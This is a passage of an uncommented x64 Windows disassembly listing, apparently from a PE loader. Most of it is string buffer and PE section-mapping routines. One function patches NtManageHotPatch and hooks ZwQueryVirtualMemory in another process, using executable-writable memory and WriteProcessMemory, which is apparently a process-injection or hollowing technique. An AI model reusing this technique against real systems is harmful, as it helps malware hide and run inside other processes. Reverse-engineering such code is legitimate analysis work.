0000000140004e56  lea      rcx, [rdi + r14]                                
0000000140004e5a  call     0x14000720e                                      ; 0x14000720e
0000000140004e5f  lea      rcx, [rsi + rdi]                                
0000000140004e63  mov      byte ptr [rcx + r14], 0                          ; 0x0
0000000140004e68  jmp      0x140004f98                                      ; 0x140004f98
0000000140004e6d  movabs   rdi, 0x7fffffffffffffff                          ; 0x7fffffffffffffff
0000000140004e77  mov      rax, rdi                                        
0000000140004e7a  sub      rax, r14                                        
0000000140004e7d  cmp      rax, rsi                                        
0000000140004e80  jb       0x140004fb0                                      ; 0x140004fb0
0000000140004e86  lea      r12, [r14 + r8]                                 
0000000140004e8a  mov      rcx, r12                                        
0000000140004e8d  or       rcx, 0xf                                         ; 0xf
0000000140004e91  cmp      rcx, rdi                                        
0000000140004e94  jbe      0x140004ec0                                      ; 0x140004ec0
0000000140004e96  movabs   rcx, 0x8000000000000000                          ; -0x8000000000000000
0000000140004ea0  add      rcx, 0x27                                        ; 0x27
0000000140004ea4  call     0x140006320                                      ; 0x140006320
0000000140004ea9  test     rax, rax                                        
0000000140004eac  je       0x140004f69                                      ; 0x140004f69
0000000140004eb2  lea      r15, [rax + 0x27]                               
0000000140004eb6  and      r15, 0xffffffffffffffe0                          ; -0x20
0000000140004eba  mov      qword ptr [r15 - 8], rax                        
0000000140004ebe  jmp      0x140004f0f                                      ; 0x140004f0f
0000000140004ec0  mov      rdx, rbp                                        
0000000140004ec3  mov      rax, rdi                                        
0000000140004ec6  shr      rdx, 1                                           ; 0x1
0000000140004ec9  sub      rax, rdx                                        
0000000140004ecc  cmp      rbp, rax                                        
0000000140004ecf  ja       0x140004e96                                      ; 0x140004e96
0000000140004ed1  lea      rax, [rdx + rbp]                                
0000000140004ed5  mov      rdi, rcx                                        
0000000140004ed8  cmp      rcx, rax                                        
0000000140004edb  cmovb    rdi, rax                                        
0000000140004edf  lea      rax, [rdi + 1]                                  
0000000140004ee3  test     rax, rax                                        
0000000140004ee6  jne      0x140004eed                                      ; 0x140004eed
0000000140004ee8  xor      r15d, r15d                                      
0000000140004eeb  jmp      0x140004f0f                                      ; 0x140004f0f
0000000140004eed  cmp      rax, 0x1000                                      ; 0x1000
0000000140004ef3  jb       0x140004f04                                      ; 0x140004f04
0000000140004ef5  lea      rcx, [rax + 0x27]                               
0000000140004ef9  cmp      rcx, rax                                        
0000000140004efc  jbe      0x140004fb6                                      ; 0x140004fb6
0000000140004f02  jmp      0x140004ea4                                      ; 0x140004ea4
0000000140004f04  mov      rcx, rax                                        
0000000140004f07  call     0x140006320                                      ; 0x140006320
0000000140004f0c  mov      r15, rax                                        
0000000140004f0f  mov      qword ptr [rbx + 0x10], r12                     
0000000140004f13  lea      r12, [r15 + r14]                                
0000000140004f17  mov      qword ptr [rbx + 0x18], rdi                     
0000000140004f1b  mov      r8, r14                                         
0000000140004f1e  mov      rcx, r15                                        
0000000140004f21  cmp      rbp, 0xf                                         ; 0xf
0000000140004f25  jbe      0x140004f7a                                      ; 0x140004f7a
0000000140004f27  mov      rdi, qword ptr [rbx]                            
0000000140004f2a  mov      rdx, rdi                                        
0000000140004f2d  call     0x140007208                                      ; 0x140007208
0000000140004f32  mov      r8, rsi                                         
0000000140004f35  mov      rdx, r13                                        
0000000140004f38  mov      rcx, r12                                        
0000000140004f3b  call     0x140007208                                      ; 0x140007208
0000000140004f40  lea      rdx, [rbp + 1]                                  
0000000140004f44  mov      byte ptr [r12 + rsi], 0                          ; 0x0
0000000140004f49  cmp      rdx, 0x1000                                      ; 0x1000
0000000140004f50  jb       0x140004f70                                      ; 0x140004f70
0000000140004f52  mov      rcx, qword ptr [rdi - 8]                        
0000000140004f56  sub      rdi, rcx                                        
0000000140004f59  sub      rdi, 8                                           ; 0x8
0000000140004f5d  cmp      rdi, 0x1f                                        ; 0x1f
0000000140004f61  ja       0x140004f69                                      ; 0x140004f69
0000000140004f63  lea      rdx, [rbp + 0x28]                               
0000000140004f67  jmp      0x140004f73                                      ; 0x140004f73
0000000140004f69  mov      ecx, 5                                           ; 0x5
0000000140004f6e  int      0x29                                             ; 0x29
0000000140004f70  mov      rcx, rdi                                        
0000000140004f73  call     0x140006310                                      ; 0x140006310
0000000140004f78  jmp      0x140004f95                                      ; 0x140004f95
0000000140004f7a  mov      rdx, rbx                                        
0000000140004f7d  call     0x140007208                                      ; 0x140007208
0000000140004f82  mov      r8, rsi                                         
0000000140004f85  mov      rdx, r13                                        
0000000140004f88  mov      rcx, r12                                        
0000000140004f8b  call     0x140007208                                      ; 0x140007208
0000000140004f90  mov      byte ptr [r12 + rsi], 0                          ; 0x0
0000000140004f95  mov      qword ptr [rbx], r15                            
0000000140004f98  mov      rax, rbx                                        
0000000140004f9b  mov      rbx, qword ptr [rsp + 0x78]                     
0000000140004fa0  add      rsp, 0x20                                        ; 0x20
0000000140004fa4  pop      r15                                             
0000000140004fa6  pop      r14                                             
0000000140004fa8  pop      r13                                             
0000000140004faa  pop      r12                                             
0000000140004fac  pop      rdi                                             
0000000140004fad  pop      rsi                                             
0000000140004fae  pop      rbp                                             
0000000140004faf  ret                                                      
0000000140004fb0  call     0x140001230                                      ; 0x140001230
0000000140004fb5  int3                                                     
0000000140004fb6  call     0x140001190                                      ; 0x140001190
0000000140004fbb  int3                                                     

; FUNCTION 0x140004fbc

0000000140004fbc  sub      rsp, 0x28                                        ; 0x28
0000000140004fc0  mov      rdx, qword ptr [rcx]                            
0000000140004fc3  mov      rax, qword ptr [rdx]                            
0000000140004fc6  movsxd   rcx, dword ptr [rax + 4]                        
0000000140004fca  mov      rcx, qword ptr [rcx + rdx + 0x48]               
0000000140004fcf  test     rcx, rcx                                        
0000000140004fd2  je       0x140004fdb                                      ; 0x140004fdb
0000000140004fd4  mov      rax, qword ptr [rcx]                            
0000000140004fd7  call     qword ptr [rax + 0x10]                          
0000000140004fda  nop                                                      
0000000140004fdb  add      rsp, 0x28                                        ; 0x28
0000000140004fdf  ret                                                      

; FUNCTION 0x140004fe0

0000000140004fe0  sub      rsp, 0x28                                        ; 0x28
0000000140004fe4  mov      rcx, qword ptr [rcx]                            
0000000140004fe7  test     rcx, rcx                                        
0000000140004fea  je       0x140004ff6                                      ; 0x140004ff6
0000000140004fec  mov      rax, qword ptr [rcx]                            
0000000140004fef  mov      edx, 1                                           ; 0x1
0000000140004ff4  call     qword ptr [rax]                                 
0000000140004ff6  add      rsp, 0x28                                        ; 0x28
0000000140004ffa  ret                                                      
0000000140004ffb  int3                                                     

; FUNCTION 0x140004ffc

0000000140004ffc  mov      qword ptr [rsp + 0x10], rbx                     
0000000140005001  push     rbp                                             
0000000140005002  push     rsi                                             
0000000140005003  push     rdi                                             
0000000140005004  push     r12                                             
0000000140005006  push     r13                                             
0000000140005008  push     r14                                             
000000014000500a  push     r15                                             
000000014000500c  sub      rsp, 0x20                                        ; 0x20
0000000140005010  mov      r14, qword ptr [rsp + 0x80]                     
0000000140005018  xorps    xmm0, xmm0                                      
000000014000501b  mov      r15, qword ptr [rsp + 0x90]                     
0000000140005023  mov      edi, 0xf                                         ; 0xf
0000000140005028  mov      r13, qword ptr [rsp + 0x88]                     
0000000140005030  mov      r12, r9                                         
0000000140005033  movups   xmmword ptr [rcx], xmm0                         
0000000140005036  mov      rsi, rcx                                        
0000000140005039  mov      qword ptr [rcx + 0x10], 0                        ; 0x0
0000000140005041  lea      rbp, [r14 + r15]                                
0000000140005045  mov      qword ptr [rcx + 0x18], 0                        ; 0x0
000000014000504d  cmp      rbp, rdi                                        
0000000140005050  jbe      0x1400050d1                                      ; 0x1400050d1
0000000140005052  mov      rax, rbp                                        
0000000140005055  or       rax, rdi                                        
0000000140005058  movabs   rdi, 0x7fffffffffffffff                          ; 0x7fffffffffffffff
0000000140005062  cmp      rax, rdi                                        
0000000140005065  jbe      0x140005084                                      ; 0x140005084
0000000140005067  movabs   rcx, 0x8000000000000000                          ; -0x8000000000000000
0000000140005071  add      rcx, 0x27                                        ; 0x27
0000000140005075  call     0x140006320                                      ; 0x140006320
000000014000507a  test     rax, rax                                        
000000014000507d  jne      0x1400050b3                                      ; 0x1400050b3
000000014000507f  lea      ecx, [rax + 5]                                  
0000000140005082  int      0x29                                             ; 0x29
0000000140005084  mov      ecx, 0x16                                        ; 0x16
0000000140005089  mov      rdi, rax                                        
000000014000508c  cmp      rax, rcx                                        
000000014000508f  cmovb    rdi, rcx                                        
0000000140005093  lea      rax, [rdi + 1]                                  
0000000140005097  test     rax, rax                                        
000000014000509a  jne      0x1400050a0                                      ; 0x1400050a0
000000014000509c  xor      ebx, ebx                                        
000000014000509e  jmp      0x1400050cc                                      ; 0x1400050cc
00000001400050a0  cmp      rax, 0x1000                                      ; 0x1000
00000001400050a6  jb       0x1400050c1                                      ; 0x1400050c1
00000001400050a8  lea      rcx, [rax + 0x27]                               
00000001400050ac  cmp      rcx, rax                                        
00000001400050af  jbe      0x140005115                                      ; 0x140005115
00000001400050b1  jmp      0x140005075                                      ; 0x140005075
00000001400050b3  lea      rbx, [rax + 0x27]                               
00000001400050b7  and      rbx, 0xffffffffffffffe0                          ; -0x20
00000001400050bb  mov      qword ptr [rbx - 8], rax                        
00000001400050bf  jmp      0x1400050cc                                      ; 0x1400050cc
00000001400050c1  mov      rcx, rax                                        
00000001400050c4  call     0x140006320                                      ; 0x140006320
00000001400050c9  mov      rbx, rax                                        
00000001400050cc  mov      qword ptr [rsi], rbx                            
00000001400050cf  jmp      0x1400050d4                                      ; 0x1400050d4
00000001400050d1  mov      rbx, rsi                                        
00000001400050d4  mov      r8, r14                                         
00000001400050d7  mov      qword ptr [rsi + 0x10], rbp                     
00000001400050db  mov      rdx, r12                                        
00000001400050de  mov      qword ptr [rsi + 0x18], rdi                     
00000001400050e2  mov      rcx, rbx                                        
00000001400050e5  call     0x140007208                                      ; 0x140007208
00000001400050ea  lea      rcx, [r14 + rbx]                                
00000001400050ee  mov      r8, r15                                         
00000001400050f1  mov      rdx, r13                                        
00000001400050f4  call     0x140007208                                      ; 0x140007208
00000001400050f9  mov      byte ptr [rbx + rbp], 0                          ; 0x0
00000001400050fd  mov      rax, rsi                                        
0000000140005100  mov      rbx, qword ptr [rsp + 0x68]                     
0000000140005105  add      rsp, 0x20                                        ; 0x20
0000000140005109  pop      r15                                             
000000014000510b  pop      r14                                             
000000014000510d  pop      r13                                             
000000014000510f  pop      r12                                             
0000000140005111  pop      rdi                                             
0000000140005112  pop      rsi                                             
0000000140005113  pop      rbp                                             
0000000140005114  ret                                                      
0000000140005115  call     0x140001190                                      ; 0x140001190
000000014000511a  int3                                                     
000000014000511b  int3                                                     

; FUNCTION 0x14000511c

000000014000511c  mov      qword ptr [rsp + 0x10], rbx                     
0000000140005121  mov      qword ptr [rsp + 0x18], rsi                     
0000000140005126  push     rbp                                             
0000000140005127  push     rdi                                             
0000000140005128  push     r15                                             
000000014000512a  lea      rbp, [rsp - 0xb0]                               
0000000140005132  sub      rsp, 0x1b0                                       ; 0x1b0
0000000140005139  mov      rax, qword ptr [rip + 0x6f00]                    ; 0x14000c040
0000000140005140  xor      rax, rsp                                        
0000000140005143  mov      qword ptr [rbp + 0xa0], rax                     
000000014000514a  mov      rsi, rdx                                        
000000014000514d  mov      rdi, rcx                                        
0000000140005150  xor      edx, edx                                        
0000000140005152  lea      rcx, [rsp + 0x44]                               
0000000140005157  mov      r8d, 0x110                                       ; 0x110
000000014000515d  call     0x140007214                                      ; 0x140007214
0000000140005162  lea      rcx, [rip + 0x4047]                              ; 0x1400091b0
0000000140005169  mov      dword ptr [rsp + 0x40], 0x114                    ; 0x114
0000000140005171  call     qword ptr [rip + 0x2fa9]                         ; 0x140008120 KERNEL32.DLL!GetModuleHandleA
0000000140005177  mov      rbx, rax                                        
000000014000517a  test     rax, rax                                        
000000014000517d  je       0x14000530c                                      ; 0x14000530c
0000000140005183  lea      rdx, [rip + 0x402e]                              ; 0x1400091b8 "RtlGetVersion"
000000014000518a  mov      rcx, rax                                        
000000014000518d  call     qword ptr [rip + 0x2fad]                         ; 0x140008140 KERNEL32.DLL!GetProcAddress
0000000140005193  lea      rcx, [rsp + 0x40]                               
0000000140005198  call     rax                                             
000000014000519a  test     eax, eax                                        
000000014000519c  jne      0x14000530c                                      ; 0x14000530c
00000001400051a2  cmp      dword ptr [rsp + 0x44], 0xa                      ; 0xa
00000001400051a7  jb       0x14000530c                                      ; 0x14000530c
00000001400051ad  jne      0x1400051bd                                      ; 0x1400051bd
00000001400051af  cmp      dword ptr [rsp + 0x4c], 0x65f4                   ; 0x65f4
00000001400051b7  jb       0x14000530c                                      ; 0x14000530c
00000001400051bd  lea      rdx, [rip + 0x4004]                              ; 0x1400091c8 "NtManageHotPatch"
00000001400051c4  mov      rcx, rbx                                        
00000001400051c7  call     qword ptr [rip + 0x2f73]                         ; 0x140008140 KERNEL32.DLL!GetProcAddress
00000001400051cd  movabs   rcx, 0xc3c00000bbb8                              ; 0xc3c00000bbb8
00000001400051d7  mov      qword ptr [rsp + 0x20], 0                        ; 0x0
00000001400051e0  mov      qword ptr [rsp + 0x38], rcx                     
00000001400051e5  lea      r8, [rsp + 0x38]                                
00000001400051ea  mov      r15d, 8                                          ; 0x8
00000001400051f0  mov      rcx, rdi                                        
00000001400051f3  mov      r9d, r15d                                       
00000001400051f6  mov      rdx, rax                                        
00000001400051f9  call     qword ptr [rip + 0x2ed9]                         ; 0x1400080d8 KERNEL32.DLL!WriteProcessMemory
00000001400051ff  lea      rdx, [rip + 0x3fda]                              ; 0x1400091e0 "ZwQueryVirtualMemory"
0000000140005206  mov      rcx, rbx                                        
0000000140005209  call     qword ptr [rip + 0x2f31]                         ; 0x140008140 KERNEL32.DLL!GetProcAddress
000000014000520f  xor      edx, edx                                        
0000000140005211  mov      dword ptr [rsp + 0x20], 0x40                     ; 0x40
0000000140005219  mov      r9d, 0x3000                                      ; 0x3000
000000014000521f  mov      r8d, 0x1000                                      ; 0x1000
0000000140005225  mov      rcx, rdi                                        
0000000140005228  mov      rbx, rax                                        
000000014000522b  call     qword ptr [rip + 0x2f17]                         ; 0x140008148 KERNEL32.DLL!VirtualAllocEx
0000000140005231  mov      qword ptr [rsp + 0x30], rax                     
0000000140005236  test     rax, rax                                        
0000000140005239  je       0x14000530c                                      ; 0x14000530c
000000014000523f  movabs   rax, 0x3b481a750ef88349                          ; 0x3b481a750ef88349
0000000140005249  mov      qword ptr [rbp + 0x78], rsi                     
000000014000524d  mov      qword ptr [rbp + 0x60], rax                     
0000000140005251  lea      r9d, [r15 + 0x18]                               
0000000140005255  movabs   rax, 0xb811750000000b15                          ; -0x47ee8afffffff4eb
000000014000525f  mov      qword ptr [rsp + 0x20], 0                        ; 0x0
0000000140005268  mov      qword ptr [rbp + 0x68], rax                     
000000014000526c  lea      r8, [rbp + 0x80]                                
0000000140005273  movabs   rax, 0xc3c00000bb                                ; 0xc3c00000bb
000000014000527d  xorps    xmm0, xmm0                                      
0000000140005280  xorps    xmm1, xmm1                                      
0000000140005283  mov      qword ptr [rbp + 0x70], rax                     
0000000140005287  mov      rdx, rbx                                        
000000014000528a  movdqa   xmmword ptr [rbp + 0x80], xmm0                  
0000000140005292  mov      rcx, rdi                                        
0000000140005295  movdqa   xmmword ptr [rbp + 0x90], xmm1                  
000000014000529d  call     qword ptr [rip + 0x2ead]                         ; 0x140008150 KERNEL32.DLL!ReadProcessMemory
00000001400052a3  mov      rdx, qword ptr [rsp + 0x30]                     
00000001400052a8  lea      r9d, [r15 + 0x38]                               
00000001400052ac  lea      r8, [rbp + 0x60]                                
00000001400052b0  mov      qword ptr [rsp + 0x20], 0                        ; 0x0
00000001400052b9  mov      rcx, rdi                                        
00000001400052bc  call     qword ptr [rip + 0x2e16]                         ; 0x1400080d8 KERNEL32.DLL!WriteProcessMemory
00000001400052c2  lea      rdx, [rbx - 8]                                  
00000001400052c6  mov      qword ptr [rsp + 0x20], 0                        ; 0x0
00000001400052cf  mov      r9d, r15d                                       
00000001400052d2  lea      r8, [rsp + 0x30]                                
00000001400052d7  mov      rcx, rdi                                        
00000001400052da  call     qword ptr [rip + 0x2df8]                         ; 0x1400080d8 KERNEL32.DLL!WriteProcessMemory
00000001400052e0  movabs   rax, 0x9090fffffff225ff                          ; -0x6f6f0000000dda01
00000001400052ea  mov      qword ptr [rsp + 0x20], 0                        ; 0x0
00000001400052f3  mov      r9d, r15d                                       
00000001400052f6  mov      qword ptr [rsp + 0x38], rax                     
00000001400052fb  lea      r8, [rsp + 0x38]                                
0000000140005300  mov      rdx, rbx                                        
0000000140005303  mov      rcx, rdi                                        
0000000140005306  call     qword ptr [rip + 0x2dcc]                         ; 0x1400080d8 KERNEL32.DLL!WriteProcessMemory
000000014000530c  mov      rcx, qword ptr [rbp + 0xa0]                     
0000000140005313  xor      rcx, rsp                                        
0000000140005316  call     0x1400062f0                                      ; 0x1400062f0
000000014000531b  lea      r11, [rsp + 0x1b0]                              
0000000140005323  mov      rbx, qword ptr [r11 + 0x28]                     
0000000140005327  mov      rsi, qword ptr [r11 + 0x30]                     
000000014000532b  mov      rsp, r11                                        
000000014000532e  pop      r15                                             
0000000140005330  pop      rdi                                             
0000000140005331  pop      rbp                                             
0000000140005332  ret                                                      
0000000140005333  int3                                                     
0000000140005334  mov      r9, r8                                          
0000000140005337  test     rcx, rcx                                        
000000014000533a  je       0x1400053d9                                      ; 0x1400053d9
0000000140005340  cmp      rdx, 0x40                                        ; 0x40
0000000140005344  jb       0x1400053d9                                      ; 0x1400053d9
000000014000534a  mov      eax, 0x5a4d                                      ; 0x5a4d
000000014000534f  cmp      word ptr [rcx], ax                              
0000000140005352  jne      0x1400053d9                                      ; 0x1400053d9
0000000140005358  cmp      dword ptr [rcx + 0x3c], 0                        ; 0x0
000000014000535c  jl       0x1400053d9                                      ; 0x1400053d9
000000014000535e  movsxd   r8, dword ptr [rcx + 0x3c]                      
0000000140005362  cmp      r8, rdx                                         
0000000140005365  ja       0x1400053d9                                      ; 0x1400053d9
0000000140005367  sub      rdx, r8                                         
000000014000536a  cmp      rdx, 0x1a                                        ; 0x1a
000000014000536e  jb       0x1400053d9                                      ; 0x1400053d9
0000000140005370  cmp      dword ptr [r8 + rcx], 0x4550                     ; 0x4550
0000000140005378  jne      0x1400053d9                                      ; 0x1400053d9
000000014000537a  movzx    r10d, word ptr [r8 + rcx + 0x14]                
0000000140005380  lea      rax, [r10 + 0x18]                               
0000000140005384  cmp      rax, rdx                                        
0000000140005387  ja       0x1400053d9                                      ; 0x1400053d9
0000000140005389  lea      rax, [rcx + 0x18]                               
000000014000538d  mov      edx, 0x20b                                       ; 0x20b
0000000140005392  add      rax, r8                                         
0000000140005395  cmp      word ptr [rax], dx                              
0000000140005398  jne      0x1400053ad                                      ; 0x1400053ad
000000014000539a  mov      edx, 0xf0                                        ; 0xf0
000000014000539f  cmp      r10w, dx                                        
00000001400053a3  jb       0x1400053d9                                      ; 0x1400053d9
00000001400053a5  mov      qword ptr [r9 + 0x10], rax                      
00000001400053a9  mov      al, 1                                            ; 0x1
00000001400053ab  jmp      0x1400053c8                                      ; 0x1400053c8
00000001400053ad  mov      edx, 0x10b                                       ; 0x10b
00000001400053b2  cmp      word ptr [rax], dx                              
00000001400053b5  jne      0x1400053d9                                      ; 0x1400053d9
00000001400053b7  mov      edx, 0xe0                                        ; 0xe0
00000001400053bc  cmp      r10w, dx                                        
00000001400053c0  jb       0x1400053d9                                      ; 0x1400053d9
00000001400053c2  mov      qword ptr [r9 + 8], rax                         
00000001400053c6  xor      al, al                                          
00000001400053c8  mov      byte ptr [r9 + 0x18], al                        
00000001400053cc  add      rcx, 4                                           ; 0x4
00000001400053d0  add      rcx, r8                                         
00000001400053d3  mov      al, 1                                            ; 0x1
00000001400053d5  mov      qword ptr [r9], rcx                             
00000001400053d8  ret                                                      
00000001400053d9  xor      al, al                                          
00000001400053db  ret                                                      

; FUNCTION 0x1400053dc

00000001400053dc  push     rbx                                             
00000001400053de  push     rbp                                             
00000001400053df  push     rsi                                             
00000001400053e0  push     rdi                                             
00000001400053e1  push     r14                                             
00000001400053e3  push     r15                                             
00000001400053e5  sub      rsp, 0x48                                        ; 0x48
00000001400053e9  mov      r15, r8                                         
00000001400053ec  mov      qword ptr [rsp + 0x20], 0                        ; 0x0
00000001400053f5  lea      r8, [rsp + 0x20]                                
00000001400053fa  mov      r14, r9                                         
00000001400053fd  mov      rdi, rdx                                        
0000000140005400  mov      rbp, rcx                                        
0000000140005403  call     0x140005334                                      ; 0x140005334
0000000140005408  test     al, al                                          
000000014000540a  jne      0x140005410                                      ; 0x140005410
000000014000540c  xor      esi, esi                                        
000000014000540e  jmp      0x140005419                                      ; 0x140005419
0000000140005410  mov      rax, qword ptr [rsp + 0x20]                     
0000000140005415  movzx    esi, word ptr [rax + 2]                         
0000000140005419  xor      ebx, ebx                                        
000000014000541b  xor      eax, eax                                        
000000014000541d  cmp      ax, si                                          
0000000140005420  jae      0x1400054d7                                      ; 0x1400054d7
0000000140005426  lea      r8, [rsp + 0x20]                                
000000014000542b  mov      qword ptr [rsp + 0x20], 0                        ; 0x0
0000000140005434  mov      rdx, rdi                                        
0000000140005437  mov      rcx, rbp                                        
000000014000543a  call     0x140005334                                      ; 0x140005334
000000014000543f  test     al, al                                          
0000000140005441  je       0x1400054e6                                      ; 0x1400054e6
0000000140005447  mov      r8, qword ptr [rsp + 0x20]                      
000000014000544c  cmp      bx, word ptr [r8 + 2]                           
0000000140005451  jae      0x1400054e6                                      ; 0x1400054e6
0000000140005457  movzx    edx, word ptr [r8 + 0x10]                       
000000014000545c  movzx    eax, bx                                         
000000014000545f  lea      rcx, [rax + rax*4]                              
0000000140005463  lea      rcx, [rdx + rcx*8]                              
0000000140005467  sub      rcx, rbp                                        
000000014000546a  add      rcx, 0x14                                        ; 0x14
000000014000546e  add      rcx, r8                                         
0000000140005471  cmp      rcx, rdi                                        
0000000140005474  ja       0x1400054e6                                      ; 0x1400054e6
0000000140005476  mov      rax, rdi                                        
0000000140005479  sub      rax, rcx                                        
000000014000547c  cmp      rax, 0x28                                        ; 0x28
0000000140005480  jb       0x1400054e6                                      ; 0x1400054e6
0000000140005482  add      rcx, rbp                                        
0000000140005485  je       0x1400054e6                                      ; 0x1400054e6
0000000140005487  cmp      dword ptr [rcx + 0x10], 0                        ; 0x0
000000014000548b  je       0x1400054cb                                      ; 0x1400054cb
000000014000548d  mov      edx, dword ptr [rcx + 0x14]                     
0000000140005490  cmp      rdx, rdi                                        
0000000140005493  ja       0x1400054e6                                      ; 0x1400054e6
0000000140005495  mov      r8d, dword ptr [rcx + 0x10]                     
0000000140005499  mov      rax, rdi                                        
000000014000549c  sub      rax, rdx                                        
000000014000549f  cmp      r8, rax                                         
00000001400054a2  ja       0x1400054e6                                      ; 0x1400054e6
00000001400054a4  mov      r9d, dword ptr [rcx + 0xc]                      
00000001400054a8  cmp      r9, r14                                         
00000001400054ab  jae      0x1400054e6                                      ; 0x1400054e6
00000001400054ad  mov      rax, r14                                        
00000001400054b0  sub      rax, r9                                         
00000001400054b3  cmp      r8, rax                                         
00000001400054b6  cmovae   r8, rax                                         
00000001400054ba  test     r8, r8                                          
00000001400054bd  je       0x1400054e6                                      ; 0x1400054e6
00000001400054bf  add      rdx, rbp                                        
00000001400054c2  lea      rcx, [r9 + r15]                                 
00000001400054c6  call     0x140007208                                      ; 0x140007208
00000001400054cb  inc      bx                                              
00000001400054ce  cmp      bx, si                                          
00000001400054d1  jb       0x140005426                                      ; 0x140005426
00000001400054d7  mov      al, 1                                            ; 0x1
00000001400054d9  add      rsp, 0x48                                        ; 0x48
00000001400054dd  pop      r15                                             
00000001400054df  pop      r14                                             
00000001400054e1  pop      rdi                                             
00000001400054e2  pop      rsi                                             
00000001400054e3  pop      rbp                                             
00000001400054e4  pop      rbx                                             
00000001400054e5  ret                                                      
00000001400054e6  xor      al, al                                          
00000001400054e8  jmp      0x1400054d9                                      ; 0x1400054d9
00000001400054ea  int3                                                     
00000001400054eb  int3                                                     

; FUNCTION 0x1400054ec

00000001400054ec  push     rbp                                             
00000001400054ee  push     rbx                                             
00000001400054ef  push     rsi                                             
00000001400054f0  push     rdi                                             
00000001400054f1  push     r12                                             
00000001400054f3  push     r14                                             
00000001400054f5  push     r15                                             
00000001400054f7  mov      rbp, rsp                                        
00000001400054fa  sub      rsp, 0x40                                        ; 0x40
00000001400054fe  xor      r12d, r12d                                      
0000000140005501  mov      r15, r8                                         
0000000140005504  mov      qword ptr [r8], r12                             
0000000140005507  xorps    xmm0, xmm0                                      
000000014000550a  lea      r8, [rbp - 0x20]                                
000000014000550e  mov      byte ptr [rbp - 8], r12b                        
0000000140005512  mov      rsi, rdx                                        
0000000140005515  mov      r14, rcx                                        
0000000140005518  movdqu   xmmword ptr [rbp - 0x18], xmm0                  
000000014000551d  call     0x140005334                                      ; 0x140005334
0000000140005522  test     al, al                                          
0000000140005524  je       0x140005608                                      ; 0x140005608
000000014000552a  mov      rax, qword ptr [rbp - 0x10]                     
000000014000552e  cmp      byte ptr [rbp - 8], r12b                        
0000000140005532  jne      0x140005538                                      ; 0x140005538
0000000140005534  mov      rax, qword ptr [rbp - 0x18]                     
0000000140005538  add      rax, 0x38                                        ; 0x38
000000014000553c  cmp      dword ptr [rax], r12d                           
000000014000553f  je       0x140005608                                      ; 0x140005608
0000000140005545  mov      ebx, dword ptr [rax]                            
0000000140005547  mov      r9d, 4                                           ; 0x4
000000014000554d  mov      edx, ebx                                        
000000014000554f  mov      r8d, 0x3000                                      ; 0x3000
0000000140005555  xor      ecx, ecx                                        
0000000140005557  call     qword ptr [rip + 0x2b9b]                         ; 0x1400080f8 KERNEL32.DLL!VirtualAlloc
000000014000555d  mov      rdi, rax                                        
0000000140005560  test     rax, rax                                        
0000000140005563  je       0x140005608                                      ; 0x140005608
0000000140005569  xorps    xmm0, xmm0                                      
000000014000556c  mov      byte ptr [rbp - 8], r12b                        
0000000140005570  lea      r8, [rbp - 0x20]                                
0000000140005574  mov      rdx, rsi                                        
0000000140005577  mov      rcx, r14                                        
000000014000557a  movdqu   xmmword ptr [rbp - 0x18], xmm0                  
000000014000557f  call     0x140005334                                      ; 0x140005334
0000000140005584  test     al, al                                          
0000000140005586  jne      0x14000558d                                      ; 0x14000558d
0000000140005588  mov      eax, r12d                                       
000000014000558b  jmp      0x1400055a1                                      ; 0x1400055a1
000000014000558d  mov      rax, qword ptr [rbp - 0x10]                     
0000000140005591  cmp      byte ptr [rbp - 8], r12b                        
0000000140005595  jne      0x14000559b                                      ; 0x14000559b
0000000140005597  mov      rax, qword ptr [rbp - 0x18]                     
000000014000559b  add      rax, 0x3c                                        ; 0x3c
000000014000559f  mov      eax, dword ptr [rax]                            
00000001400055a1  cmp      rax, rsi                                        
00000001400055a4  mov      r8, rsi                                         
00000001400055a7  cmovb    r8, rax                                         
00000001400055ab  test     r8, r8                                          
00000001400055ae  je       0x1400055f7                                      ; 0x1400055f7
00000001400055b0  cmp      r8, rbx                                         
00000001400055b3  ja       0x1400055f7                                      ; 0x1400055f7
00000001400055b5  mov      rdx, r14                                        
00000001400055b8  mov      rcx, rdi                                        
00000001400055bb  call     0x140007208                                      ; 0x140007208
00000001400055c0  lea      r8, [rbp - 0x20]                                
00000001400055c4  mov      qword ptr [rbp - 0x20], r12                     
00000001400055c8  mov      rdx, rsi                                        
00000001400055cb  mov      rcx, r14                                        
00000001400055ce  call     0x140005334                                      ; 0x140005334
00000001400055d3  test     al, al                                          
00000001400055d5  je       0x140005619                                      ; 0x140005619
00000001400055d7  mov      rax, qword ptr [rbp - 0x20]                     
00000001400055db  cmp      word ptr [rax + 2], r12w                        
00000001400055e0  je       0x140005619                                      ; 0x140005619
00000001400055e2  mov      r9, rbx                                         
00000001400055e5  mov      r8, rdi                                         
00000001400055e8  mov      rdx, rsi                                        
00000001400055eb  mov      rcx, r14                                        
00000001400055ee  call     0x1400053dc                                      ; 0x1400053dc
00000001400055f3  test     al, al                                          
00000001400055f5  jne      0x14000562e                                      ; 0x14000562e
00000001400055f7  xor      edx, edx                                        
00000001400055f9  mov      r8d, 0x8000                                      ; 0x8000
00000001400055ff  mov      rcx, rdi                                        
0000000140005602  call     qword ptr [rip + 0x2ae0]                         ; 0x1400080e8 KERNEL32.DLL!VirtualFree
0000000140005608  xor      eax, eax                                        
000000014000560a  add      rsp, 0x40                                        ; 0x40
000000014000560e  pop      r15                                             
0000000140005610  pop      r14                                             
0000000140005612  pop      r12                                             
0000000140005614  pop      rdi                                             
0000000140005615  pop      rsi                                             
0000000140005616  pop      rbx                                             
0000000140005617  pop      rbp                                             
0000000140005618  ret                                                      
0000000140005619  cmp      rsi, rbx                                        
000000014000561c  mov      r8, rbx                                         
000000014000561f  mov      rdx, r14                                        
0000000140005622  mov      rcx, rdi                                        
0000000140005625  cmovb    r8, rsi                                         
0000000140005629  call     0x140007208                                      ; 0x140007208
000000014000562e  mov      qword ptr [r15], rbx                            
0000000140005631  mov      rax, rdi                                        
0000000140005634  jmp      0x14000560a                                      ; 0x14000560a
0000000140005636  int3                                                     
0000000140005637  int3                                                     

; FUNCTION 0x140005638

0000000140005638  mov      qword ptr [rsp + 0x20], rbx                     
000000014000563d  push     rsi                                             
000000014000563e  push     rdi                                             
000000014000563f  push     r14                                             
0000000140005641  sub      rsp, 0x60                                        ; 0x60
0000000140005645  mov      rax, qword ptr [rip + 0x69f4]                    ; 0x14000c040
000000014000564c  xor      rax, rsp                                        
000000014000564f  mov      qword ptr [rsp + 0x50], rax                     
0000000140005654  mov      qword ptr [rdx], 0                               ; 0x0
000000014000565b  xor      r9d, r9d                                        
000000014000565e  mov      rsi, r8                                         
0000000140005661  mov      qword ptr [r8], 0                                ; 0x0
